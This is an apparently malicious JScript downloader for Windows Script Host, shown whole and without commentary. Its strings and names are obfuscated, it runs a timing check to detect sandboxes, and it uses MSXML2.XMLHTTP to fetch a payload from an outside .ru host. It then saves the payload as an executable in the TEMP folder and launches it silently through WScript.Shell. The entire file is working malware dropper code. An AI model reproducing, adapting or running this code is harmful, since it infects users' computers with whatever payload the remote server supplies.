var Z0 = false;
var V0 = "Create"+"Object";
var T = function V() {return WScript[V0]("WScript"+".Shell");}(), X = 11;
var D0 = "MSXML2"+".XMLHTTP";
var LD = 2;
var Z = LD - 2;
function C(A1){T["Run"](A1, Z, Z);};
function E(){return D0 + "";};
function C0(ZP, J0){Z = Z * 1; return ZP - J0;};
function E0(){return V0;};
/*@cc_on
  @if (@_win32 || @_win64)
    Z0 = true;
  @end
@*/
if (Z0)
{
var TX = "";
function P(){return 22;};
var P0 = 0; var XC = 0;
function R()
{
var BL = new this["Date"]();
var A0 = BL["getUTCMilliseconds"]();
WScript["Sleep"](P());
var BL = new this["Date"]();
var TY = BL["getUTCMilliseconds"]();
WScript["Sleep"](P());
var BL = new this["Date"]();
var IQ = BL["getUTCMilliseconds"]();
var P0 = "D";
P0 = C0(TY, A0);
var XC = "J";
XC = C0(IQ, TY);
TX = "open";
return C0(P0, XC);
}
var W = false;
var WF = false;
for (var GF = Z; GF < P() * 1; GF++){if (R() != Z){
W = true; 
XC = "31" + 11 * P0 + XC; 
WF = true; 
break;
}}
function BI() {return ((W == true) && (W == WF)) ? 1 : Z;};
if (W && BI() && WF){
function FE() {return T["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "KaDRXcczDASK5J.ex" + "e";};
 GW = E();
 RS = WScript[V0](GW);
 var FZ = 1;
do { 
	for (;FZ;){
	try {
		if (FZ == 1)
		{
			RS[TX]("GET", "http://buketrose.ru/h3sia", false);
			RS["send"]();
			SB = "Sleep";
			FZ = 2;
		}
		WScript[SB](P() + 120); 
		if (RS["readystate"] < 2 * 2) continue;
		FZ = Z;
		function O(R0) {var WQ = (1, 2, 3, 4, 5, R0); return WQ;};
		LJ = WScript[E0()]("ADODB.Stream");
		GW = LJ;
		GW[TX]();
		GW["type"] = O(1);
		GW["write"](RS["ResponseBody"]);
		LJ["position"] = O(Z);
		GW["Save" + "ToFile"](FE(), 2);
		LJ["cl"+"ose"]();
		A = FE();
		C(A);
	} catch(S){};};
}while (FZ);
}
}

